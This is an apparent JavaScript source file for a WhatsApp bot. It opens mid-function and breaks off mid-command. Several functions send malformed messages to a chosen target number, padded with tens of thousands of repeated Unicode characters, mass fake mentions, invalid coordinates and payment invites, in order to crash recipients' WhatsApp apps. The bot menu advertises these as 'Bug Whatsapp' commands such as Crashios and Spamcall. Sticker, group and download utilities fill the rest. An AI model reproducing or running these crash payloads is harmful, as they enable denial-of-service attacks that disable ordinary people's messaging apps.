                                                buttonParamsJson: "{\"display_text\":\"Copy Crash Code\",\"id\":\"message\",\"copy_code\":\"#CRASHCODE9741\"}"
                                            },
                                            {
                                                name: "cta_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Set Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_cancel_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Cancel Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "address_message",
                                                buttonParamsJson: "{\"display_text\":\"Send Crash Address\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "send_location",
                                                buttonParamsJson: "\0"
                                            }
                                        ]
                                    }
                                }
                            ],
                            messageVersion: 1,
                        }
                    }
                }
            }
        },
        { quoted: VcardQuoted }
    );
    await Ryc.relayMessage(isTarget, msg.message, {
        messageId: msg.key.id,
    });
    console.log("Success! Crl Button Sent")
}

async function CallGc(isTarget) {
await Ryc.relayMessage(isTarget, {
            viewOnceMessage: {
                message: {
                    scheduledCallCreationMessage: {
                        callType: "VIDEO",
                        scheduledTimestampMs: Date.now() + 9741,
                        title: "Assalamualaikum" + `𑲭𑲭`.repeat(100000) + `ꦾ`.repeat(50000),
                        inviteCode: 'https://www.instagram.com/coreinpin/',
                    }
                }
            }
        }, {});
      }

async function IosMJ(isTarget, Ptcp = true) {
      await Ryc.relayMessage(
        isTarget,
        {
          extendedTextMessage: {
            text: "Assalamualaikum" + "ꦾ".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: isTarget,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Ueheheheeh",
                body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/Apinmpfive",
                mediaUrl: "https://t.me/Apinmpfive",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/Apinmpfive",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbcayCampaignId: "smb_cay_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: isTarget,
              },
            }
          : {}
      );
    }

async function NewIos(isTarget, Ptcp = true) {
Ryc.relayMessage(
    isTarget,
    {
        extendedTextMessage: {
            text: `Assalamualaikum ${'ꦾ'.repeat(103000)} ${'@13135550002'.repeat(25000)}`,
            contextInfo: {
                mentionedJid: [
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 15000 }, () => `13135550002${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                ],
                stanzaId: "1234567890ABCDEF",
                participant: "13135550002@s.whatsapp.net",
                quotedMessage: {
                    callLogMesssage: {
                        isVideo: true,
                        callOutcome: "1",
                        durationSecs: "0",
                        callType: "REGULAR",
                        participants: [
                            {
                                jid: "13135550002@s.whatsapp.net",
                                callOutcome: "1"
                            }
                        ]
                    }
                },
                remoteJid: "13135550002@s.whastapp.net",
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 99999999,
                isForwarded: true,
                quotedAd: {
                    advertiserName: "Example Advertiser",
                    mediaType: "IMAGE",
                    jpegThumbnail: Jepeg,
                    caption: "This is an ad caption"
                },
                placeholderKey: {
                    remoteJid: "13135550002@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                    title: "Assalamualaikum",
                    body: `Assalamualaikum ${'\0'.repeat(200)}`,
                    mediaType: "VIDEO",
                    renderLargerThumbnail: true,
                    previewType: "VIDEO",
                    thumbnail: Jepeg,
                    sourceType: "x",
                    sourceId: "x",
                    sourceUrl: "https://www.facebook.com/WhastApp",
                    mediaUrl: "https://www.facebook.com/WhastApp",
                    containsAutoReply: true,
                    showAdAttribution: true,
                    ctwaClid: "ctwa_clid_example",
                    ref: "ref_example"
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                    url: "https://www.facebook.com/WhatsApp"
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "13135550002@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                    utmSource: "utm_source_example",
                    utmCampaign: "utm_campaign_example"
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "13135550002@newsletter",
                    serverMessageId: 1,
                    newsletterName: "Meta Ai",
                    contentType: "UPDATE",
                    accessibilityText: "Meta Ai"
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                smbriyuCampaignId: "smb_riyu_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                    showMmDisclosure: true
                }
            }
        }
    },
    Ptcp
        ? {
              participant: {
                  jid: isTarget
              }
          }
        : {}
       
);
console.log("Success! Force Ios Sent")
}

 async function XiosVirus(isTarget) {
      Ryc.relayMessage(
        isTarget,
        {
          extendedTextMessage: {
            text: `Assalamualaikum` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: isTarget,
              participant: isTarget,
              quotedMessage: {
                conversation: "Assalamualaikum" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        },
        {
          messageId: null,
        }
      );
    }

    async function QDIphone(isTarget) {
      Ryc.relayMessage(
        isTarget,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: isTarget,
              participant: isTarget,
              quotedMessage: {
                conversation: "Assalamualaikum" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        },
        {
          messageId: null,
        }
      );
    }
    async function QPayStriep(isTarget) {
      await Ryc.relayMessage(
        isTarget,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        }
      );
    }
      async function QPayIos(isTarget) {
      await Ryc.relayMessage(
        isTarget,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        }
      );
    }
    async function UpiCrash(isTarget) {
      await Ryc.relayMessage(
        isTarget,
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        }
      );
    }

    async function VenCrash(isTarget) {
      await Ryc.relayMessage(
        isTarget,
        {
          paymentInviteMessage: {
            serviceType: "VENMO",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        }
      );
    }

    async function AppXCrash(isTarget) {
      await Ryc.relayMessage(
        isTarget,
        {
          paymentInviteMessage: {
            serviceType: "CASHAPP",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        }
      );
    }

    async function SmCrash(isTarget) {
      await Ryc.relayMessage(
        isTarget,
        {
          paymentInviteMessage: {
            serviceType: "SAMSUNGPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        }
      );
    }

    async function SqCrash(isTarget) {
      await Ryc.relayMessage(
        isTarget,
        {
          paymentInviteMessage: {
            serviceType: "SQUARE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        }
      );
    }

    async function FBiphone(isTarget) {
      await Ryc.relayMessage(
        isTarget,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        }
      );
    }

    async function QXIphone(isTarget) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await Ryc.relayMessage(
        isTarget,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://t.me/Apinmpfive",
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        }
      );
    }

//END
//STIKER AND BRAT FUNCTION

function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
async function makeStickerFromUrl(imageUrl, Ryc, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await Ryc.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `𝐀𝐩͛𝐢͢𝐧.𝐌𝐩͛͢𝟓𝄷`,
                    body: `𝐀𝐩͛𝐢͢𝐧.𝐌𝐩͛͢𝟓𝄷`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: ThumbUrl, 
                    sourceUrl: `https://www.instagram.com/coreinpin/`
                }
            }
        }, { quoted: lol });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        ReplyRyc('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}

async function fetchBuffer (url, options) {
  try {
    options ? options : {};
    const res = await axios({
      method: "GET",
      url,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
        DNT: 1,
        "Upgrade-Insecure-Request": 1,
      },
      ...options,
      responseType: "arraybuffer",
    });
    return res.data;
  } catch (err) {
    return err;
  }
};

Ryc.ments = async (text) => {
    return [m.sender];
};

//END

const RunTime = `_${runtime(process.uptime())}_`
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
switch(command) {
//ALL MENU CASE {
case 'menu': 
case 'help': {
Ryc.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
let Menu = `Hi, I'm Apin whatsapp bot created by Apin.

\`[ ⩟ ] Information Bot\`
- Creator *𝐀𝐩͛𝐢͢𝐧.𝐌𝐩͛͢𝟓𝄷*
- Dev Name *𝐀𝐩͛𝐢͢𝐧.𝐌𝐩͛͢𝟓𝄷*
- Version *Stable*
- Prefix *Multi*
- Type *Case*` 


const buttons = [
  {
    buttonId: `.nextmenu`, 
    buttonText: { 
      displayText: 'Next' 
    }
  }, {
    buttonId: ".about", 
    buttonText: {
      displayText: "About"
    }
   }, {
   buttonId: ".tqto", 
    buttonText: {
      displayText: "Thanks To"
    }
  }
]

const buttonMessage = {
    document: { url: "https://t.me/apinmpfivee" },
    mimetype: "image/png",
    fileName: "Apin - Assistant",
    fileLength: 999999999999999,
    pageCount: 99999,
    jpegThumbnail: (await resize (fs.readFileSync('./System/path/menu2.png'), 400, 400)),
    caption: Menu,
    footer: '© Apin - 2025\n',
    mentions: await Ryc.ments('Aʟʟ Mᴇɴᴜ'),
    buttons: buttons,
    headerType: 1,
    contextInfo: { 
      forwardingScore: 99999, 
      externalAdReply: { 
        body: "i will die with you !", 
        containsAutoReply: true, 
        mediaType: 1, 
        mediaUrl: "peler",  
        renderLargerThumbnail: true, 
        showAdAttribution: true, 
        sourceId: 'Tes', 
        sourceType: 'PDF', 
        previewType: 'PDF', 
        sourceUrl: "https://www.instagram.com/coreinpin/", 
       thumbnail: fs.readFileSync('./System/path/menu.png'), 
        thumbnailUrl: "https://files.catbox.moe/5d3jau.jpg", 
        title: '𝐀𝐩͛𝐢͢𝐧.𝐌𝐩͛͢𝟓𝄷',
      },
    },
    viewOnce: true,
    headerType: 6
  };

  const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'Options' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Options",
                    sections: [
                        {
                            title: "Select This Options",
                            highlight_label: "",
                            rows: [
                                {
                                    header: "Bug Feature",
                                    title: "Bug Whatsapp",
                                    description: "",
                                    id: ".nextmenu"
                                },
                                {
                                    header: "Fun Feature",
                                    title: "Random Audio",
                                    description: "",
                                    id: ".randomaudio"
                                }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

return await Ryc.sendMessage(m.chat, buttonMessage, { quoted: lol });
/*
Ryc.sendMessage(m.key.remoteJid, {
     image: { url: "https://pomf2.lain.la/f/5l5eayi.jpg" },
     caption: Menu,
     footer: "Ryc - 2025",
     buttons: [ 
         { buttonId: `.tes`,
          buttonText: {
          displayText: 'Status' 
          }, type: 1 },
         { buttonId: `.ewe`,
          buttonText: {
          displayText: '\nGw Penyefong Betton😂'
          }, type: 1 }
     ],
     headerType: 1,
     viewOnce: false
 },{ quoted: lol })
 
Ryc.sendMessage(m.chat, {
        text: Menu,
        contextInfo: {
            mentionedJid: [m.sender],
            forwardedNewsletterMessageInfo: {
                newsletterName: "Information Tama FleX Agency",
                newsletterJid: `120363321780343299@newsletter`
            },
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: `Ryc ( Riyu )`,
                body: `Finix Bot With Javascript`,
                mediaType: 1,
                thumbnailUrl: "https://files.catbox.moe/n1nqsc.jpg",
                thumbnail: ``,
                sourceUrl: `https://youtube.com/@tamainfinity`
            }
        }
    }, { quoted: lol })
  */
}
break
case 'nextmenu': {
Ryc.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
let Next = `\`[ ⩟ ] Bug Whatsapp\`
- Crashios *Number*
- Combine *Button*
- Cnc *Number*
- Tester *Number*
- Spamcall *Number*
- Critical *In Place*

\`[ ⩟ ] Owner Feature\`
- Addpremium *Number*
- Addowner *Number*
- Delpremium *Number*
- Delowner *Number*
- Shutdown *Auto*
- Restart *Auto*
- Setpp *Reply*
- Delpp *Auto*

\`[ ⩟ ] Group Feature\`
- Resetlinkgc *Auto*
- Getlinkgc *Auto*
- Hidetag *Text*
- Tagall *Text*
- Kick *@Tag*

\`[ ⩟ ] Other Feature\`
- Sticker *Reply*
- Tiktok *Link*
- Tovn *Reply*
- Play *Title*
- Brat *Text*
- Rvo *Reply*
- Ocr *Text*
- Qc *Reply*
- Ping *Show*
- Randomaudio *Random*`
const buttons = [
  {
    buttonId: `.help`, 
    buttonText: { 
      displayText: 'Back' 
    }
  }, {
    buttonId: ".about", 
    buttonText: {
      displayText: "About"
    }
   }, {
   buttonId: ".tqto", 
    buttonText: {
      displayText: "Thanks To"
    }
  }
]

const buttonMessage = {
    document: { url: "https://t.me/apinmpfivee" },
    mimetype: "image/png",
    fileName: "Apin - Assistant",
    fileLength: 999999999999999,
    pageCount: 99999,
    jpegThumbnail: (await resize (fs.readFileSync('./System/path/menu2.png'), 400, 400)),
    caption: Next,
    footer: '© Apin - 2025\n',
    mentions: await Ryc.ments('Aʟʟ Mᴇɴᴜ'),
    buttons: buttons,
    headerType: 1,
    contextInfo: { 
      forwardingScore: 99999, 
      externalAdReply: { 
        body: "i will die with you !", 
        containsAutoReply: true, 
        mediaType: 1, 
        mediaUrl: "peler",  
        renderLargerThumbnail: true, 
        showAdAttribution: true, 
        sourceId: 'Tes', 
        sourceType: 'PDF', 
        previewType: 'PDF', 
        sourceUrl: "https://www.instagram.com/coreinpin/", 
       thumbnail: fs.readFileSync('./System/path/menu.png'), 
        thumbnailUrl: "https://files.catbox.moe/e20f25.jpg", 
        title: 'Apin',
      },
    },
    viewOnce: true,
    headerType: 6
  };

  const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'Options' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Options",
                    sections: [
                        {
                            title: "Select This Options",
                            highlight_label: "",
                            rows: [
                                {
                                    header: "Bug Feature",
                                    title: "Bug Whatsapp",
                                    description: "",
                                    id: ".nextmenu"
                                },
                                {
                                    header: "Fun Feature",
                                    title: "Random Audio",
                                    description: "",
                                    id: ".randomaudio"
                                }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

return await Ryc.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
break
// All Case Fitur
case "about": {
Ryc.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
ReplyRyc(`\`[ ⩟ ] About\`
This bot was developed to help users carry out various activities, this bot also has an attack feature, so use it wisely.
Warm Greetings: Apin 

Social Media Creators: 
- Telegram : https://t.me/apinmpfivee 
- Email: hackaccepted2000@gmail.com`)
}
break;
case "tqto": {
Ryc.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
ReplyRyc(`\`[ ⩟ ] Thanks To\`
- Allah *My God*
- 𝐀𝐩͛𝐢͢𝐧.𝐌𝐩͛͢𝟓𝄷 *Developer*`) 
}
break;
case "restart": {
if (!CreatorOnly) return ReplyRyc(`*Your Not My Owner*`);
ReplyRyc("Restarting Bot...")
setTimeout(() => {
process.send("Restart")
}, 3000)
}
break
case "shutdown": {
if (!CreatorOnly) return ReplyRyc("*Your Not My Owner*")
ReplyRyc(`Shutdown Bot...`)
setTimeout(() => {
process.exit()
}, 3000)
}
break
case 'randomaudio': {
Ryc.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
  if (command) {
    // Daftar file audio yang tersedia
    const audioList = [
      './System/Audio/audio1.mp3',
      './System/Audio/audio2.mp3',
      './System/Audio/audio3.mp3',
      './System/Audio/audio4.mp3',
      './System/Audio/audio5.mp3',
      './System/Audio/audio6.mp3'
    ];
    const randomAudio = audioList[Math.floor(Math.random() * audioList.length)];
    Ryc.sendMessage(
      m.chat, 
      { 
        audio: { url: randomAudio }, 
        mimetype: 'audio/mp4', 
        ptt: true
      }, 
      { quoted: lol }
    );
  }
}
break
case 'ping': {
    const old = performance.now()
    const ram = (os.totalmem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const free_ram = (os.freemem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const serverInfo = `server information

> CPU : *${os.cpus().length} Core, ${os.cpus()[0].model}*
> Uptime : *${Math.floor(os.uptime() / 86400)} days*
> Ram : *${free_ram}/${ram}*
> Speed : *${(performance.now() - old).toFixed(5)} ms*`;
    Ryc.sendMessage(m.chat, {
        text: serverInfo
    },{ quoted: lol })
}
break;

case 'addowner': case 'addown':
if (!CreatorOnly) return ReplyRyc("*Your Not My Onwer*")
  if (!args[0]) return ReplyRyc(`Penggunaan ${prefix + command} Example ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let loadnum = await Ryc.onWhatsApp(numero + `@s.whatsapp.net`);
  if (loadnum.length == 0) return ReplyRyc(`Number Invalid!!!`);
  owner.push(numero);
  Premium.push(numero);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRyc(`Number ${numero} succes add to database!`);
  break;

case 'delowner': case 'delown':
if (!CreatorOnly) return ReplyRyc("*Your Not My Onwer*")
  if (!args[0]) return ReplyRyc(`Penggunaan ${prefix + command} Example:\n ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Owner.indexOf(numero2);
  numload = Premium.indexOf(numero2);
  Owner.splice(numeroX, 1);
  Premium.splice(numload, 1);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(Owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRyc(`Number ${numero2} succes delate to database!`);
  break;

case 'addpremium': case 'addprem':
if (!CreatorOnly) return ReplyRyc("*Your Not My Onwer*")
  if (!args[0]) return ReplyRyc(`Penggunaan ${prefix + command} Example ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let Invalid = await Ryc.onWhatsApp(numero + `@s.whatsapp.net`);
  if (Invalid.length == 0) return ReplyRyc(`Number Invalid!!!`);
  Premium.push(numero);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRyc(`Number ${numero} succes add to database!`);
  break;

case 'delpremium': case 'delprem':
if (!CreatorOnly) return ReplyRyc("*Your Not My Onwer*")
  if (!args[0]) return ReplyRyc(`Penggunaan ${prefix + command} Example ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Premium.indexOf(numero2);
  Premium.splice(numeroX, 1);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRyc(`Number ${numero2} succes delate to database!`);
  break;

case 'qc': {
  if (!q) return ReplyRyc(`Send command with text. ${prefix + command} Tams Ryuichi`);
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: `${pushname}`,
          photo: { 
            url: await Ryc.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
          }
        },
        text: `${q}`,
        replyMessage: {},
      },
    ],
  };
  let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  Ryc.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;

  case "play": {
    if (!qtext) return ReplyRyc("Send Title");
    await Ryc.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });

    try {
        // Ambil URL video atau cari di YouTube
        const txt = /https:\/\/\youtube.com|youtu.be/.test(qtext)
            ? qtext
            : (await yts(qtext)).videos[0].url;

        // Request data dari API
        const { data } = await axios.get(`https://axeel.my.id/api/download/audio?url=${txt}`, {
            headers: {
